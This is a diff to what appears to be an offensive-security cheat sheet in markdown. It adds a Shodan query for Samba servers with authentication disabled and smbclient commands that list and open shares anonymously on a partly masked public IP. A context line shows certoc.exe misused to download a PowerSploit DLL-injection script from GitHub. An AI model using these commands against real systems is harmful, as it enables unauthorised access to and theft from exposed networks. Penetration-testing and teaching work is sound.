@@ -722,6 +722,18 @@ Downloads text formatted files
 ```
 certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1
 ```
+## Shodan for SMB:
+
+SMB ( Server Message Block ) authentication without credentials, also known as anonymous SMB access, allows users to access shared resources on a network without providing username or passwords. This can be useful for accessing shared folders that have been configured to allow anonymous access.
+
+```
+"Authentication: disabled" port:445 product:"Samba" 
+```
+
+```
+smbclient -L //200.x.x.29/ -N  
+smbclient //200.x.x.29/info
+```
 
 ## Plundering Account Information with RPCClient and SMBClient:
 
